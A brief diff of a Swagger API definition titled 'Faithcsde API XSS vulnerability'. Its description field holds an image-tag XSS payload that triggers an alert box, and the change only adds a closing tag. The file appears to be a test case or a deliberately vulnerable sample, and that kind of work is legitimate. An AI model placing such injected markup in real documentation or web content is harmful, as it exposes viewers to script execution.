@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Faithcsde API XSS vulnerability
   description: |
-            <img onerror=alert('XSS') src=1>">
+            <img onerror=alert('XSS') src=1>"></img>
   version: production
 basePath: /docs/
 produces:
